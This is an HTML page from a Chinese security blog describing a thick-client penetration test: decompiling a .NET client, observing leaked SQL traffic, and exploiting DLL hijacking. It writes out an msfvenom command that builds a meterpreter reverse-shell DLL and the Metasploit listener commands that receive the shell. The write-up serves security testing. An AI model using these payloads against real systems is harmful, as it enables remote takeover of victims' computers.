@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+  <meta http-equiv="content-type" content="text/html;charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noodp"/>
+  <meta name="author" content="Olist.213">
+  <meta name="description" content="一点牢骚">
+  
+  
+  <link rel="prev" href="https://olist213.github.io/posts/tools_resoure/" />
+  
+  <link rel="canonical" href="https://olist213.github.io/posts/thick_client_penetration_testing/" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+  <title>
+       
+       
+           记一次胖客户端程序渗透测试 | Olist.213
+       
+  </title>
+  <meta name="title" content="记一次胖客户端程序渗透测试 | Olist.213">
+    
+  
+  <link rel="stylesheet" href="/font/iconfont.css">
+  <link rel="stylesheet" href="/css/main.min.css">
+
+
+  
+  
+ 
+
+<script type="application/ld+json">
+ "@context" : "http://schema.org",
+    "@type" : "BlogPosting",
+    "mainEntityOfPage": {
+         "@type": "WebPage",
+         "@id": "https:\/\/olist213.github.io"
+    },
+    "articleSection" : "posts",
+    "name" : "记一次胖客户端程序渗透测试",
+    "headline" : "记一次胖客户端程序渗透测试",
+    "description" : "胖客户端就是我们常说的C\/S架构的应用程序，其主要特点是客户端执行部分应用逻辑，服务器端则提供存储和计算支持，两者之间通过网络进行通信和交互。而我们常说的“瘦客户端”就是基于B\/S架构的应用程序，也就是基于浏览器的应用程序。\n拿到一个胖客户端程序可以先看下胖客户端是什么架构，一般像后缀是exe结尾的，很多都是C、C#或者.NET编译的。\n可以通过CFF Explorer查看目标程序的架构，如下图。\n可以看到，这是一个32位的程序，利用Microsoft Visual Studio .NET编译，是一个.net程序。\n像这种.NET的程序，可以用dnspy（GitHub - dnSpy\/dnSpy: .NET debugger and assembly editor），DNspy是一款著名的.NET反编译器，可以反编译.NET编译后的文件，包括可执行文件（exe）、DLL文件、NET程序集等。使用DNspy反编译exe文件可以方便地查看其源代码和内部结构，帮助理解和分析程序的运行机制。\n可以从中看到sql语句查询，从这里我们可以看到sql语句未做任何过滤，直接拼接，但是这里直接加了单引号，导致每次查询都会多有一个单引号，没法绕过。\n但是如果客户端程序可以直接反编译的话，那么如果说客户端程序在没做任何签名的情况下，可以重新编译，打包成另一个程序，后果就是可以伪造官方客户端，从中写入恶意文件，通过这种方式可以进行钓鱼等攻击。\n此处不放图了，修改后，可以直接像正常客户端程序那样使用。\n也可以通过wireshark或者科来对其流量进行检测，检测应用在传输的过程中是否泄漏敏感信息。\n从上图可以看出，此胖客户端使用tds数据库协议，节点的ip地址、端口等内容。\n还包括在传输过程中泄漏了sql语句\n除了wireshark和科来等工具分析流量之外，echo mirage也可以用来进行流量分析，可自行下载使用。\n接下来，回到我们的这篇文章的正题，dll劫持漏洞，既然是胖客户端应用，那么就会加载各类dll文件。\nDLL劫持（DLL Hijacking）是一种攻击技术，利用系统在加载动态链接库（DLL）时的搜索顺序错误或缺陷，在系统中寻找可用的DLL文件时，将正常的文件替换成恶意文件，使得系统加载并执行了被控制的DLL文件，达到攻击者的目的。\nDLL劫持攻击的危害大，可以被用于各种恶意活动，例如：\n1、窃取敏感信息：恶意DLL文件可能会窃取用户的敏感信息，例如登录账号、密码等。 2、执行远程指令：通过劫持DLL文件，攻击者可能会远程控制用户的计算机执行恶意指令，例如下载、安装其他恶意程序等。 3、破坏系统的完整性和稳定性：劫持的DLL文件可能会破坏系统的安全性、完整性和稳定性，例如篡改系统设置、破坏系统文件等。\ndll劫持利用的第一步是获取可利用的dll文件。\n这个时候就的使用Sysinternals Suite套件，利用套件下的Procmon Monitor工具，可以查看当前运行的程序的相关进程情况。\n加载后可以看到各类当前运行程序的进程名、PID、路径等，按ctrl\u002bL过滤处特定程序的进程。\n同时如果目标程序加载了配置文件的话，通过这个工具也可以查看到。\n既然是dll劫持，那么我们就要去找可利用的dll。\n在目标程序的目录下，找到了一个DWrite.dll文件，这个文件是Windows操作系统的一部分，它是DirectWrite API动态链接库文件。DirectWrite是一个用于渲染文本和字体的API，它使用硬件加速和先进的字体渲染技术来提供更高质量、更清晰的文本呈现效果。\n在Windows系统中，许多应用程序（比如Adobe Creative Suite等）都会使用DirectWrite技术来渲染文本和字体，因此dwrite.dll文件在许多应用程序中都会被调用和使用。\n可以通过搜索去搜索NAME NOT FOUND的这种进程。\n找dll可以多尝试几个dll文件，除了找到dll文件，还需要了解windows下dll文件的加载顺序。\n1、搜索应用程序所在目录 2、Windows系统目录（如C:\\Windows\\System32） 3、常规的windows目录（ C:\\Windows\\System32 和 C:\\Windows） 4、搜索 Administrator 类型的 Windows 系统目录（如C:\\Windows\\SystemWOW64） 5、搜索 PATH 环境变量中的所有目录 6、当前工作目录\n操作系统按照上述顺序在指定的目录和文件中查找 DLL 文件，并将它们加载到应用程序中。\n了解了dll加载顺序，并且找到了dll文件，那么就可以开始构造恶意的dll文件了，通过metasploit框架来进行构造。\nmsfvenom -p windows\/meterpreter\/reverse_tcp LHOST= 192.",
+    "inLanguage" : "zh-cn",
+    "author" : "",
+    "creator" : "",
+    "publisher": "",
+    "accountablePerson" : "",
+    "copyrightHolder" : "",
+    "copyrightYear" : "2023",
+    "datePublished": "2023-04-01 23:13:41 \u002b0800 CST",
+    "dateModified" : "2023-04-01 23:13:41 \u002b0800 CST",
+    "url" : "https:\/\/olist213.github.io\/posts\/thick_client_penetration_testing\/",
+    "wordCount" : "103",
+    "keywords" : [ "web安全","胖客户端", "Olist.213"]
+}
+</script>
+
+</head>
+
+  
+
+
+  <body class="">
+    <div class="wrapper">
+        <nav class="navbar">
+    <div class="container">
+        <div class="navbar-header header-logo">
+        	<a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://olist213.github.io">Olist.213</a>
+        </div>
+        <div class="menu navbar-right">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog&#39;s</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/tags/" title="">Tags</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+                <a class="menu-item" href="/study_book/" title="">学习笔记Day</a>
+                
+                <a class="menu-item" href="/security_process/" title="">安全流程</a>
+                
+        </div>
+    </div>
+</nav>
+<nav class="navbar-mobile" id="nav-mobile" style="display: none">
+     <div class="container">
+        <div class="navbar-header">
+            <div>  <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://olist213.github.io">Olist.213</a></div>
+            <div class="menu-toggle">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+     
+          <div class="menu" id="mobile-menu">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog&#39;s</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/tags/" title="">Tags</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+                <a class="menu-item" href="/study_book/" title="">学习笔记Day</a>
+                
+                <a class="menu-item" href="/security_process/" title="">安全流程</a>
+                
+        </div>
+    </div>
+</nav>
+    	 <main class="main">
+          <div class="container">
+      		
+<article class="post-warp" itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">记一次胖客户端程序渗透测试</h1>
+        <div class="post-meta">
+                Written by <a itemprop="name" href="https://olist213.github.io" rel="author"></a> with ♥ 
+                <span class="post-time">
+                on <time datetime=2023-04-01 itemprop="datePublished">April 1, 2023</time>
+                </span>
+                in
+                
+        </div>
+    </header>
+    <div class="post-content">
+        
+
+        
+            
+        
+
+        
+        
+     
+          
+          
+          
+
+          
+          
+          
+
+          <p>胖客户端就是我们常说的C/S架构的应用程序，其主要特点是客户端执行部分应用逻辑，服务器端则提供存储和计算支持，两者之间通过网络进行通信和交互。而我们常说的“瘦客户端”就是基于B/S架构的应用程序，也就是基于浏览器的应用程序。</p>
+<p>拿到一个胖客户端程序可以先看下胖客户端是什么架构，一般像后缀是exe结尾的，很多都是C、C#或者.NET编译的。</p>
+<p>可以通过CFF Explorer查看目标程序的架构，如下图。</p>
+<p><img src="https://raw.githubusercontent.com/olist213/olistimg/master/picgo/202304012207555.png" alt="image.png"></p>
+<p>可以看到，这是一个32位的程序，利用Microsoft Visual Studio .NET编译，是一个.net程序。</p>
+<p>像这种.NET的程序，可以用dnspy（<a href="https://github.com/0xd4d/dnSpy">GitHub - dnSpy/dnSpy: .NET debugger and assembly editor</a>），DNspy是一款著名的.NET反编译器，可以反编译.NET编译后的文件，包括可执行文件（exe）、DLL文件、NET程序集等。使用DNspy反编译exe文件可以方便地查看其源代码和内部结构，帮助理解和分析程序的运行机制。</p>
+<p><img src="https://raw.githubusercontent.com/olist213/olistimg/master/picgo/202304012214740.png" alt="image.png"></p>
+<p>可以从中看到sql语句查询，从这里我们可以看到sql语句未做任何过滤，直接拼接，但是这里直接加了单引号，导致每次查询都会多有一个单引号，没法绕过。</p>
+<p><img src="https://raw.githubusercontent.com/olist213/olistimg/master/picgo/202304012216486.png" alt="image.png"></p>
+<p>但是如果客户端程序可以直接反编译的话，那么如果说客户端程序在没做任何签名的情况下，可以重新编译，打包成另一个程序，后果就是可以伪造官方客户端，从中写入恶意文件，通过这种方式可以进行钓鱼等攻击。</p>
+<p>此处不放图了，修改后，可以直接像正常客户端程序那样使用。</p>
+<p>也可以通过wireshark或者科来对其流量进行检测，检测应用在传输的过程中是否泄漏敏感信息。</p>
+<p><img src="https://raw.githubusercontent.com/olist213/olistimg/master/picgo/202304012212080.png" alt="image.png"></p>
+<p>从上图可以看出，此胖客户端使用tds数据库协议，节点的ip地址、端口等内容。</p>
+<p><img src="https://raw.githubusercontent.com/olist213/olistimg/master/picgo/202304012213770.png" alt="image.png"></p>
+<p>还包括在传输过程中泄漏了sql语句</p>
+<p>除了wireshark和科来等工具分析流量之外，echo mirage也可以用来进行流量分析，可自行下载使用。</p>
+<p>接下来，回到我们的这篇文章的正题，dll劫持漏洞，既然是胖客户端应用，那么就会加载各类dll文件。</p>
+<p>DLL劫持（DLL Hijacking）是一种攻击技术，利用系统在加载动态链接库（DLL）时的搜索顺序错误或缺陷，在系统中寻找可用的DLL文件时，将正常的文件替换成恶意文件，使得系统加载并执行了被控制的DLL文件，达到攻击者的目的。</p>
+<p>DLL劫持攻击的危害大，可以被用于各种恶意活动，例如：</p>
+<p>1、窃取敏感信息：恶意DLL文件可能会窃取用户的敏感信息，例如登录账号、密码等。
+2、执行远程指令：通过劫持DLL文件，攻击者可能会远程控制用户的计算机执行恶意指令，例如下载、安装其他恶意程序等。
+3、破坏系统的完整性和稳定性：劫持的DLL文件可能会破坏系统的安全性、完整性和稳定性，例如篡改系统设置、破坏系统文件等。</p>
+<p>dll劫持利用的第一步是获取可利用的dll文件。</p>
+<p>这个时候就的使用Sysinternals Suite套件，利用套件下的Procmon Monitor工具，可以查看当前运行的程序的相关进程情况。</p>
+<p><img src="https://raw.githubusercontent.com/olist213/olistimg/master/picgo/202304012227414.png" alt="image.png"></p>
+<p>加载后可以看到各类当前运行程序的进程名、PID、路径等，按ctrl+L过滤处特定程序的进程。</p>
+<p><img src="https://raw.githubusercontent.com/olist213/olistimg/master/picgo/202304012229916.png" alt="image.png"></p>
+<p>同时如果目标程序加载了配置文件的话，通过这个工具也可以查看到。</p>
+<p>既然是dll劫持，那么我们就要去找可利用的dll。</p>
+<p><img src="https://raw.githubusercontent.com/olist213/olistimg/master/picgo/202304012233015.png" alt="image.png"></p>
+<p>在目标程序的目录下，找到了一个DWrite.dll文件，这个文件是Windows操作系统的一部分，它是DirectWrite API动态链接库文件。DirectWrite是一个用于渲染文本和字体的API，它使用硬件加速和先进的字体渲染技术来提供更高质量、更清晰的文本呈现效果。</p>
+<p>在Windows系统中，许多应用程序（比如Adobe Creative Suite等）都会使用DirectWrite技术来渲染文本和字体，因此dwrite.dll文件在许多应用程序中都会被调用和使用。</p>
+<p>可以通过搜索去搜索NAME NOT FOUND的这种进程。</p>
+<p><img src="https://raw.githubusercontent.com/olist213/olistimg/master/picgo/202304012236243.png" alt="image.png"></p>
+<p>找dll可以多尝试几个dll文件，除了找到dll文件，还需要了解windows下dll文件的加载顺序。</p>
+<p>1、搜索应用程序所在目录
+2、Windows系统目录（如C:\Windows\System32）
+3、常规的windows目录（ C:\Windows\System32 和 C:\Windows）
+4、搜索 Administrator 类型的 Windows 系统目录（如C:\Windows\SystemWOW64）
+5、搜索 PATH 环境变量中的所有目录
+6、当前工作目录</p>
+<p>操作系统按照上述顺序在指定的目录和文件中查找 DLL 文件，并将它们加载到应用程序中。</p>
+<p>了解了dll加载顺序，并且找到了dll文件，那么就可以开始构造恶意的dll文件了，通过metasploit框架来进行构造。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span> 192.168.100.100 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -a x86 --platform Windows -f dll &gt; DWrite.dll
+
+<span style="color:#75715e"># LHOST= 192.168.100.100，LHOST写上监听的ip</span>
+</code></pre></div><p><img src="https://raw.githubusercontent.com/olist213/olistimg/master/picgo/202304012239850.png" alt="image.png"></p>
+<p><img src="https://raw.githubusercontent.com/olist213/olistimg/master/picgo/202304012239445.png" alt="image.png"></p>
+<p>将dll文件复制到客户端目录下，启动vps上的msf进行监听，然后启动客户端exe程序，成功返回shell。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf6&gt; use exploit/multi/handle
+msf6&gt; set payload windows/meterpreter/reverse_tcp
+msf6&gt; set lhost 192.168.100.100
+msf6&gt; set lport <span style="color:#ae81ff">4444</span>
+msf6&gt; exploit
+</code></pre></div><p><img src="https://raw.githubusercontent.com/olist213/olistimg/master/picgo/202304012243733.png" alt="image.png"></p>
+<p>直接返回运行目标程序的客户端的系统shell。</p>
+<hr>
+<p>后续，写这篇文章是因为看到了一篇关于白加黑的文章（<a href="https://xz.aliyun.com/t/12376">https://xz.aliyun.com/t/12376</a>），看到其中的内容就是关于dll劫持的，发现自己以前也遇到过这种dll的漏洞，特此记录下。</p>
+
+    </div>
+
+    <div class="post-copyright">
+             
+            <p class="copyright-item">
+                <span>Author:</span>
+                <span>Olist.213 </span>
+                </p>
+            
+           
+             
+            <p class="copyright-item">
+                    <span>Link:</span>
+                    <a href=https://olist213.github.io/posts/thick_client_penetration_testing/>https://olist213.github.io/posts/thick_client_penetration_testing/</span>
+            </p>
+            
+            
+    </div>
+
+  
+    <div class="post-tags">
+        
+            <section>
+            <i class="iconfont icon-tag"></i>Tag(s): 
+            
+            <span class="tag"><a href="https://olist213.github.io/tags/web%E5%AE%89%E5%85%A8/">
+                    #web安全</a></span>
+            
+            <span class="tag"><a href="https://olist213.github.io/tags/%E8%83%96%E5%AE%A2%E6%88%B7%E7%AB%AF/">
+                    #胖客户端</a></span>
+            
+            </section>
+        
+        <section>
+                <a href="javascript:window.history.back();">back</a></span> · 
+                <span><a href="https://olist213.github.io">home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+        
+        <a href="https://olist213.github.io/posts/tools_resoure/" class="prev" rel="prev" title="一些工具(updating)"><i class="iconfont icon-left"></i>&nbsp;一些工具(updating)</a>
+         
+        
+    </div>
+
+    <div class="post-comment">
+          
+                 
+          
+    </div>
+</article>
+          </div>
+		   </main>
+      <footer class="footer">
+    <div class="copyright">
+        &copy;
+        
+        <span itemprop="copyrightYear">2018 - 2023</span>
+        
+        <span class="with-love">
+    	 <i class="iconfont icon-love"></i> 
+         </span>
+         
+            <span class="author" itemprop="copyrightHolder"><a href="https://olist213.github.io">Olist.213</a> | </span> 
+         
+
+         
+		  <span>Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow">Hugo</a> & <a href="https://github.com/liuzc/leaveit" target="_blank" rel="external nofollow">LeaveIt</a></span> 
+    </div>
+</footer>
+
+
+
+
+
+
+
+
+
+
+
+
+    
+     <link href="//lib.baomitu.com/lightgallery/1.6.11/css/lightgallery.min.css" rel="stylesheet">  
+      
+     <script src="/js/vendor_gallery.min.js" async="" ></script>
+    
+  
+
+
+
+     </div>
+  </body>
+</html>
